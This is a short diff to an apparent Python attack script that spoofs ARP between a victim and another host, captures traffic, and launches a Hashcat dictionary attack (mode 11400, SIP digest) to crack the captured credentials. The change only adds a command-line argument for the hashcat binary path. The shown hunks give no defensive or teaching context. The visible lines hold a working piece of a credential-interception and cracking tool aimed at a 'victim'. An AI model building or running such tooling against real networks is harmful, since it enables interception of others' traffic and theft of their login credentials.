@@ -97,7 +97,7 @@ if __name__ == "__main__":
     target_file = "target.txt"
     cracked_file = "cracked.txt"
 
-    if len(sys.argv) < 4:
+    if len(sys.argv) < 5:
         print("Incorrect number of arguments!")
         exit(1)
 
@@ -106,7 +106,8 @@ if __name__ == "__main__":
     victim_mac = getmacbyip(victim_ip)
     spoof_ip = sys.argv[2]
     spoof_mac = getmacbyip(spoof_ip)
-    dictionary_file = sys.argv[3]
+    hashcat_binary = sys.argv[3]
+    dictionary_file = sys.argv[4]
 
     # Get current device's IP and MAC
     attacker_iface = conf.iface
@@ -145,5 +146,5 @@ if __name__ == "__main__":
 
     # Launch a dictionary attack on the target
     print("Starting Hashcat dictionary attack...")
-    subprocess.run(["hashcat", "-m", "11400", "-a", "0", target_file,
+    subprocess.run([hashcat_binary, "-m", "11400", "-a", "0", target_file,
                    dictionary_file, "--potfile-disable", "-o", cracked_file])
